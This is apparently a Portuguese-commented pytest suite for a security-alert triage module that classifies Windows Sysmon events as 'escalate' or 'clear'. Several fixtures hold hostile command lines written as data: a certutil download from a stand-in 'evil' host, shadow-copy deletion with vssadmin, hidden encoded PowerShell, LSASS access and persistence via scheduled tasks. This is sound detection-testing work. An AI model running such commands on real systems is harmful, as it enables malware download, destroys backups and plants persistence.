"""
Testes do PORTÃO DE TRIAGEM determinístico (temporal_agent/triage.py).

Determinísticos, 0 tokens, sem API. Cobrem:
  * cada regra de escopo evento dispara no fixture positivo;
  * fixtures benignos ficam 'clear' com prova (benign_evidence);
  * a regra de cadeia (spawn→IP externo) casa a sequência;
  * a lógica de decisão: high escala sozinho; 1 medium não; 2 medium escalam.

Run: pytest tests/test_triage.py -v
"""
from __future__ import annotations

import json
import pathlib
import sys
from datetime import datetime, timedelta, timezone

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from silver_agent import parser as P                # noqa: E402
from temporal_agent import triage as T              # noqa: E402
from temporal_agent.correlate import Chain, Step    # noqa: E402

RULES = T.load_rules()


def _silver(raw: dict) -> dict:
    s, _ = P.deterministic_parse(json.dumps(raw))
    return s


def _decide_one(raw: dict) -> T.TriageDecision:
    return T.triage_events([_silver(raw)], RULES)


# ---------------------------------------------------------------------------
# Regras de evento — positivos escalam / benignos ficam clear
# ---------------------------------------------------------------------------
def test_lsass_access_escala():
    d = _decide_one({"EventID": 10, "Channel": "Microsoft-Windows-Sysmon/Operational",
                     "Hostname": "H", "RecordNumber": 1, "UtcTime": "2026-01-01 10:00:00.000",
                     "SourceImage": "C:\\Temp\\x.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                     "GrantedAccess": "0x1410"})
    assert d.decision == "escalate"
    assert "T1003.001" in d.attack_ids


def test_vssadmin_shadows_escala():
    d = _decide_one({"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
                     "Hostname": "H", "RecordNumber": 2, "UtcTime": "2026-01-01 10:00:00.000",
                     "Image": "C:\\Windows\\System32\\vssadmin.exe",
                     "CommandLine": "vssadmin.exe delete shadows /all /quiet"})
    assert d.decision == "escalate"
    assert "T1490" in d.attack_ids


def test_certutil_download_escala():
    d = _decide_one({"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
                     "Hostname": "H", "RecordNumber": 3, "UtcTime": "2026-01-01 10:00:00.000",
                     "Image": "C:\\Windows\\System32\\certutil.exe",
                     "CommandLine": "certutil.exe -urlcache -split -f http://evil/x.exe"})
    assert d.decision == "escalate"
    assert "T1105" in d.attack_ids


def test_encoded_powershell_escala():
    d = _decide_one({"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
                     "Hostname": "H", "RecordNumber": 4, "UtcTime": "2026-01-01 10:00:00.000",
                     "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                     "CommandLine": "powershell -nop -w hidden -enc SQBFAFgAKAA..."})
    assert d.decision == "escalate"
    assert "T1059.001" in d.attack_ids


def test_masquerade_scr_escala():
    d = _decide_one({"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
                     "Hostname": "H", "RecordNumber": 5, "UtcTime": "2026-01-01 10:00:00.000",
                     "Image": "C:\\Users\\j\\cod.3aka3.scr", "CommandLine": "cod.3aka3.scr"})
    assert d.decision == "escalate"
    assert "T1036" in d.attack_ids


def test_service_install_medium_sozinho_fica_clear():
    d = _decide_one({"EventID": 7045, "Channel": "System", "Hostname": "H",
                     "RecordNumber": 6, "UtcTime": "2026-01-01 10:00:00.000",
                     "ServiceName": "Svc", "ImagePath": "C:\\ProgramData\\a.exe"})
    # 1 medium isolado não escala (precisa corroboração)
    assert d.decision == "clear"
    assert "PERSIST_SERVICE_INSTALL" in d.benign_evidence["medium_uncorroborated"]


# ---------------------------------------------------------------------------
# Benignos — nada dispara, prova presente
# ---------------------------------------------------------------------------
def test_logon_interno_fica_clear_com_prova():
    d = _decide_one({"EventID": 4624, "Channel": "Security", "Hostname": "H",
                     "RecordNumber": 7, "UtcTime": "2026-01-01 09:00:00.000",
                     "SubjectUserName": "jsilva", "LogonType": "3", "IpAddress": "10.0.0.7"})
    assert d.decision == "clear"
    assert not d.fired
    assert d.benign_evidence["positive_signals"]


def test_notepad_sistema_fica_clear():
    d = _decide_one({"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
                     "Hostname": "H", "RecordNumber": 8, "UtcTime": "2026-01-01 09:05:00.000",
                     "Image": "C:\\Windows\\System32\\notepad.exe",
                     "CommandLine": "notepad.exe C:\\Users\\j\\nota.txt"})
    assert d.decision == "clear"
    assert not d.fired


# ---------------------------------------------------------------------------
# Decisão: 2 medium corroboram e escalam
# ---------------------------------------------------------------------------
def test_dois_medium_escalam():
    schtasks = _silver({"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
                        "Hostname": "H", "RecordNumber": 9, "UtcTime": "2026-01-01 10:00:00.000",
                        "Image": "C:\\Windows\\System32\\schtasks.exe",
                        "CommandLine": "schtasks /create /tn U /tr C:\\ProgramData\\a.exe"})
    runkey = _silver({"EventID": 13, "Channel": "Microsoft-Windows-Sysmon/Operational",
                      "Hostname": "H", "RecordNumber": 10, "UtcTime": "2026-01-01 10:01:00.000",
                      "EventType": "SetValue",
                      "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\U"})
    d = T.triage_events([schtasks, runkey], RULES)
    assert d.decision == "escalate"          # 2 medium corroboram
    assert {"T1053.005", "T1547.001"} <= set(d.attack_ids)


# ---------------------------------------------------------------------------
# Regra de cadeia: process_create → IP externo
# ---------------------------------------------------------------------------
def _step(dt, cat, image=None, artifact=None, eid=1):
    return Step(time=dt.strftime("%H:%M:%S"), event_utc_time=dt, source_file="dadosdia1",
                host="H", actor="u", event_id=eid, category=cat, image_name=image,
                artifact=artifact, record_number=1)


def test_chain_c2_porta_web_nao_dispara():
    """Tráfego legítimo do Windows a IP de nuvem na 443 NÃO deve escalar (era o falso
    positivo em massa): C2_SPAWN_THEN_EXTERNAL exclui 80/443/53 e a porta 443 é padrão."""
    t0 = datetime(2026, 1, 1, 10, 0, 0, tzinfo=timezone.utc)
    ch = Chain(kind="entity_timeline", entity="H/u")
    ch.steps = [_step(t0, "process_create", image="backgroundTaskHost.exe", artifact="backgroundTaskHost.exe"),
                _step(t0 + timedelta(seconds=3), "network_connect", artifact="52.167.250.154:443", eid=3)]
    d = T.triage_chain(ch, RULES)
    assert not any(h.rule_id in ("C2_SPAWN_THEN_EXTERNAL", "C2_NONSTANDARD_PORT") for h in d.fired)
    assert d.decision == "clear"


def test_chain_c2_porta_nao_padrao_dispara_medium():
    """Beacon a porta atípica logo após spawn dispara a regra (medium). Sozinho fica
    clear (precisa corroboração); casa a regra e o T-ID."""
    t0 = datetime(2026, 1, 1, 10, 0, 0, tzinfo=timezone.utc)
    ch = Chain(kind="entity_timeline", entity="H/u")
    ch.steps = [_step(t0, "process_create", image="mal.exe", artifact="mal.exe"),
                _step(t0 + timedelta(seconds=3), "network_connect", artifact="192.168.0.5:1234", eid=3)]
    d = T.triage_chain(ch, RULES)
    assert any(h.rule_id == "C2_NONSTANDARD_PORT" for h in d.fired)
    assert d.decision == "clear"          # 1 medium isolado não escala


def test_chain_masquerade_mais_c2_escala():
    """Cadeia realista: binário mascarado (.scr, high) + beacon a porta atípica (medium)
    → escala. É o padrão da cadeia APT29 real."""
    t0 = datetime(2026, 1, 1, 10, 0, 0, tzinfo=timezone.utc)
    ch = Chain(kind="entity_timeline", entity="H/u")
    ch.steps = [_step(t0, "process_create", image="cod.3aka3.scr", artifact="cod.3aka3.scr"),
                _step(t0 + timedelta(seconds=3), "network_connect", artifact="192.168.0.5:1234", eid=3)]
    d = T.triage_chain(ch, RULES)
    assert d.decision == "escalate"
    assert "T1036" in d.attack_ids


# ---------------------------------------------------------------------------
# Assinatura digital + caminho do binário
# ---------------------------------------------------------------------------
def test_schtask_userpath_escala_high():
    """Tarefa agendada apontando p/ pasta gravável pelo usuário é sinal forte."""
    d = _decide_one({"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
                     "Hostname": "H", "RecordNumber": 20, "UtcTime": "2026-01-01 10:00:00.000",
                     "Image": "C:\\Windows\\System32\\schtasks.exe",
                     "CommandLine": "schtasks /create /tn U /tr C:\\ProgramData\\a.exe"})
    assert d.decision == "escalate"
    assert any(h.rule_id == "PERSIST_SCHTASK_USERPATH" for h in d.fired)


def test_schtask_systempath_nao_e_high():
    """Mesma tarefa apontando p/ Program Files fica em sinal fraco (não escala sozinha)."""
    d = _decide_one({"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
                     "Hostname": "H", "RecordNumber": 21, "UtcTime": "2026-01-01 10:00:00.000",
                     "Image": "C:\\Windows\\System32\\schtasks.exe",
                     "CommandLine": "schtasks /create /tn U /tr \"C:\\Program Files\\App\\upd.exe\""})
    assert not any(h.rule_id == "PERSIST_SCHTASK_USERPATH" for h in d.fired)
    assert d.decision == "clear"


def test_exec_nao_assinado_userpath_escala():
    """Binário não assinado rodando de pasta do usuário (produção com assinatura no log)."""
    d = _decide_one({"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
                     "Hostname": "H", "RecordNumber": 22, "UtcTime": "2026-01-01 10:00:00.000",
                     "Image": "C:\\Users\\j\\AppData\\Local\\Temp\\a.exe",
                     "CommandLine": "a.exe", "Signed": "false", "SignatureStatus": "Unavailable"})
    assert d.decision == "escalate"
    assert any(h.rule_id == "EXEC_UNSIGNED_USERPATH" for h in d.fired)


def test_exec_assinado_sistema_fica_clear_com_prova():
    """Binário assinado pela Microsoft em caminho de sistema: prova positiva de legítimo."""
    d = _decide_one({"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
                     "Hostname": "H", "RecordNumber": 23, "UtcTime": "2026-01-01 10:00:00.000",
                     "Image": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "svchost.exe -k netsvcs",
                     "Signed": "true", "Signature": "Microsoft Windows", "SignatureStatus": "Valid"})
    assert d.decision == "clear"
    provas = " ".join(d.benign_evidence["positive_signals"])
    assert "diretórios de sistema" in provas
    assert "assinatura digital válida" in provas


def test_exec_userpath_sem_assinatura_fica_clear_medium():
    """Sem assinatura no log (como neste dataset), execução de pasta de usuário é só
    sinal fraco: NÃO escala sozinha e signed:false não casa (estado 'desconhecido')."""
    d = _decide_one({"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
                     "Hostname": "H", "RecordNumber": 24, "UtcTime": "2026-01-01 10:00:00.000",
                     "Image": "C:\\Users\\j\\AppData\\Local\\Programs\\app\\app.exe",
                     "CommandLine": "app.exe"})
    assert d.decision == "clear"
    assert any(h.rule_id == "EXEC_FROM_USERPATH" for h in d.fired)
    assert not any(h.rule_id == "EXEC_UNSIGNED_USERPATH" for h in d.fired)


def test_signature_state_helper():
    assert T._signature_state({"signed": True, "signature": "Microsoft Corporation",
                               "signature_status": "Valid"}) == "trusted"
    assert T._signature_state({"signed": False, "signature_status": "Unavailable"}) == "untrusted"
    assert T._signature_state({"signed": True, "signature": "Contoso LLC",
                               "signature_status": "Valid"}) == "untrusted"   # emissor não confiável
    assert T._signature_state({"signed": None, "signature": None,
                               "signature_status": None}) == "unknown"        # log sem assinatura


def test_path_helpers():
    assert T._is_system_path("C:\\Windows\\System32\\svchost.exe")
    assert not T._is_system_path("C:\\Users\\j\\AppData\\Local\\Temp\\a.exe")
    assert T._is_userwritable_path("C:\\ProgramData\\victim\\x.scr")
    assert not T._is_userwritable_path("C:\\Windows\\System32\\cmd.exe")


def test_external_ip_helper():
    assert T.is_external_ip("8.8.8.8")
    assert not T.is_external_ip("10.0.0.5")
    assert not T.is_external_ip("192.168.0.5")
    assert not T.is_external_ip("127.0.0.1")
    assert not T.is_external_ip(None)
